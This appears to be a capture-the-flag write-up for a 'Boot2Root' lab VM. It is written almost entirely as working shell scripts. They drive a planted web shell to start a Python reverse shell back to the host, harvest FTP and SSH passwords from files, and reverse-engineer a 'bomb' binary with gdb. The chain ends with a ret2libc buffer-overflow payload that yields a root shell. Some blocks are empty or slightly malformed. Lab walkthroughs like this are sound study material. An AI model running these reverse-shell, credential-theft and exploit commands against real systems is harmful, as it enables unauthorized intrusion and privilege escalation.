## Find our HOST machine IP
```shell
HOST_IP=`ifconfig en0 | grep inet | awk '{print $2}'`
echo $HOST_IP
```

## Find our VM IP
```shell
IP=`prlctl list -f | grep "Boot2Root" | awk '{print $3}'`
echo $IP
```

## Inspect by reverse shell

Declare executor
```shell
shell_executor () {
  cmd=`echo "$1" | sed 's/ /%20/g'`
  curl -s -k https://$IP/forum/templates_c/executor.php?execute=$cmd
}
reverse_shell () {
  screen -ls | grep '(Detached)' | awk '{print $1}' | xargs -I % -t screen -X -S % quit
  screen -dmS ncat bash -c 'sleep 1; ncat -nvklp 1234'
  reverse_shell_cmd="python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$HOST_IP\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn(\"/bin/bash\");'"
  sleep 3
  executor $reverse_shell_cmd &
  screen -r ncat && kill %2
}
```

### Run reverse shell
```shell
reverse_shell
```

## Find the answers

### Look at home dir files
```shell
shell_executor "ls -la /home/"
```

### First clue
```shell
credential=`shell_executor 'cat /home/LOOKATME/password'`
ftp_login=`echo $credential | awk '{print $2}' | cut -d ":" -f 1`
echo $ftp_login
ftp_password=`echo $credential | awk '{print $2}' | cut -d ":" -f 2`
echo $ftp_password
```

### Scan ports
```shell
nmap $IP | grep "open"
```

## Inspect FTP
Declare ftp executor
```shell
ftp_executor() {
  echo "quit" | lftp $IP -u $ftp_login,$ftp_password -e "$1"
}
```
### Get files list
```shell
ftp_executor "ls"
```

### Read readme
```shell
ftp_executor "cat README"
ssh_login=`ftp_executor "cat README" | cut -d "'" -f 2`
echo $ssh_login
```

### Download fun file
```shell
ftp_executor "get fun"
mv fun scripts/writeup2/
cd scripts/writeup2/
tar xvf fun 2> /dev/null
cd - > /dev/null
```

## Inspect fun file

### Read any .pcap file
```shell
cd scripts/writeup2/ft_fun/
ls -l | tail -n 1 | awk '{print $9}' | xargs cat
cd - > /dev/null
```

### Transform chunks to .C code
```shell
cd scripts/writeup2/
python3 collect_binary.py
cd - > /dev/null
```

### Run collected binary
```shell
cd scripts/writeup2/
gcc main.c && ./a.out
ssh_password=`./a.out | head -n 1 | awk '{print $4}'`
ssh_password=`echo -n $ssh_password | sha256sum | awk '{print $1}'`
echo $ssh_password
cd - > /dev/null
```

## Inspect SSH

### Get files
Declare ssh_executor
```shell
ssh_executor () {
  sshpass -p "$ssh_password" ssh $ssh_login@$IP "$1" 2> /dev/null
}
```
```shell
ssh_executor "ls"
```

### Read readme
```shell
ssh_executor "cat README"
```

### Run bomb binary
```shell
ssh_executor "echo | ./bomb"
```

### Reverse binary
```shell
ssh_executor 'echo "disass main" | gdb ./bomb | grep phase'
```

### Reverse Phase 1
```shell
ssh_executor 'echo "disass phase_1" | gdb ./bomb -q | egrep "phase|strings|bomb"'
```

### Get first word
```shell
first_word=`echo -e "\n" | ssh_executor 'echo "disass phase_1" | gdb ./bomb -q -ex "x/s 0x80497c0" | head -n 2 | grep "0x" | cut -d "\"" -f 2'`
echo $first_word
```

### Reverse Phase 2
```shell
ssh_executor 'echo "disass phase_2" | gdb ./bomb -q | egrep "phase|read_six_numbers|bomb|imul"'
```

### Selection Phase 2 word
```shell
python3 scripts/writeup2/phase_2.py
second_word=`python3 scripts/writeup2/phase_2.py | grep "Result:" | cut -d ":" -f 2`
echo $second_word
```

### Reverse Phase 3
```shell
ssh_executor 'echo "disass phase_3" | gdb ./bomb -q | egrep "phase|cmp|call"'
```

### Selection Phase 3 word
```shell
third_word=`python3 scripts/writeup2/phase_3.py`
echo $third_word
```

### Reverse Phase 4
```shell
ssh_executor 'echo "disass phase_4" | gdb ./bomb -q | egrep "phase|cmp|call"'
```

### Selection Phase 4 word
```shell
fourth_word=`python3 scripts/writeup2/phase_4.py`
echo $fourth_word
```

### Reverse Phase 5
```shell
ssh_executor 'echo "disass phase_5" | gdb ./bomb -q | egrep "phase|cmp|call|strings_not_equal"'
```

### Selection Phase 5 word
```shell
fifth_word=`python3 scripts/writeup2/phase_5.py`
echo $fifth_word
```

### Reverse Phase 6
```shell

```

### Selection Phase 6 word
```shell
echo -e "\n" | ssh_executor 'rm -f /tmp/phase_6_words.txt'

for (( i=1; i <= 6; i++ ))
do
  node=`echo -e "\n" | ssh_executor "echo 'p node$i' | gdb -q ./bomb | grep '=' | cut -d '=' -f 2 | sed 's/ //g'"`
  echo $node
  echo -e "\n" | ssh_executor "echo '$node.$i ' >> /tmp/phase_6_words.txt"
done

echo -e "\n" | ssh_executor 'cat /tmp/phase_6_words.txt | sort -r'
sixth_word=`echo -e "\n" | ssh_executor 'cat /tmp/phase_6_words.txt | sort -r | cut -d "." -f 2 | tr -d "\n" | xargs'`
echo $sixth_word
```

### Run bomb binary
```shell
ssh_executor "echo -e '$first_word\n$second_word\n$third_word\n$fourth_word\n$fifth_word\n$sixth_word' | ./bomb"
```

### Concat thor password
```shell
ssh_login="thor"
thor_password=`echo $first_word$second_word$third_word$fourth_word$fifth_word$sixth_word | sed "s/ //g" | sed "s/opukmq/opekmq/" | sed "s/315/135/"`
ssh_password=$thor_password
echo $thor_password
```

## Inspect Thor

### Get files from ssh
```shell
ssh_executor "ls"
```

### Read useful file
```shell
echo -e"\n" | ssh_executor "cat README"
echo -e"\n" | ssh_executor "cat turtle" > scripts/writeup2/turtle
```

### Get zaz password
```shell
ssh_login="zaz"
zaz_password=`python3 scripts/writeup2/turtle_draw.py`
echo $zaz_password
zaz_password=`echo -n "$zaz_password" | md5sum | awk '{print $1}'`
echo $zaz_password
ssh_password=$zaz_password
```

## Inspect Zaz

### Get files from ssh
```shell
ssh_executor "ls"
```

### Reverse binary
```shell
ssh_executor 'echo "disass main" | gdb ./exploit_me -q | egrep "strcpy|puts"'
```

### Find eip offset
```shell
python3 scripts/writeup2/zaz.py 'offset' $ssh_login $ssh_password $IP
```

### Collect data for ret2libc
```shell
sh_address=`echo -e"\n" | ssh_executor 'echo -e "q" | gdb ./exploit_me -q -ex "b* main" -ex "r" -ex "find 0xb7e2c000,0xb7fcf000,\"/bin/sh\"" | egrep "^0x"'`
echo $sh_address
sh_address=`python3 scripts/writeup2/zaz.py 'address' $sh_address`
system_address=`echo -e"\n" | ssh_executor 'echo -e "q" | gdb ./exploit_me -q "b* main" -ex "r" -ex "i func system" | egrep " system" | cut -d " " -f 1'`
echo $system_address
system_address=`python3 scripts/writeup2/zaz.py 'address' $system_address`
exit_address=`echo -e"\n" | ssh_executor 'echo -e "q" | gdb ./exploit_me -q "b* main" -ex "r" -ex "i func exit" | egrep " exit$" | cut -d " " -f 1'`
echo $exit_address
exit_address=`python3 scripts/writeup2/zaz.py 'address' $exit_address`
```

### Create shellcode
```shell
cmd="\$(python -c 'print \".\" * 140 + \"$system_address\" + \"$exit_address\" + \"$sh_address\"')"
ssh_executor << EOF 
echo $cmd > shell_code
EOF
```

### Run root shell
```shell
ssh_executor '(echo "id && whoami"; cat - ) | ./exploit_me `cat shell_code`'
```